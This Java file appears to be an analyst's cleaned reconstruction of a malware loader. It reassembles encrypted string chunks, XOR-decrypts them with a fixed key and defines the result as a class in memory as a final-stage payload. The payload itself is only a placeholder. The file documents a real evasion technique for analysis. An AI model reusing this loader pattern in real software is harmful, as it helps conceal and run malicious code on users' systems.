import java.util.Base64;

/**
 * Cleaned PayloadLoader (formerly z.java)
 * This is the massive 9.2MB resource container.
 * Its only job is to decrypt and load the final malicious payload into memory.
 */
public class PayloadLoader extends ClassLoader {
    private static byte[] decryptedPayload;
    
    // In the original, this array is 9MB+ and split into thousands of strings
    private static final String[] ENCRYPTED_CHUNKS = {
        "I ) >/H   >/H.  >/H...", // Thousands of these
    };

    static {
        decryptAll();
    }

    /**
     * Reassembles and decrypts the final binary from the string chunks.
     */
    private static void decryptAll() {
        StringBuilder sb = new StringBuilder();
        for (String chunk : ENCRYPTED_CHUNKS) {
            sb.append(chunk);
        }
        
        byte[] rawData = sb.toString().getBytes();
        decryptedPayload = new byte[rawData.length];
        
        // The core XOR decryption logic found in z.a() and method_FE()
        long key = 32951919813926L;
        for (int i = 0; i < rawData.length; i++) {
            decryptedPayload[i] = (byte) (rawData[i] ^ (key + i));
        }
    }

    /**
     * Loads the decrypted payload into the JVM as a functional class.
     */
    public Class<?> loadPayload() {
        if (decryptedPayload == null) return null;
        return defineClass(null, decryptedPayload, 0, decryptedPayload.length);
    }

    public static void main(String[] args) {
        // This class is called by the entry point to trigger the final stage
        PayloadLoader loader = new PayloadLoader();
        Class<?> payloadClass = loader.loadPayload();
        System.out.println("[*] Final payload loaded into memory.");
    }
}
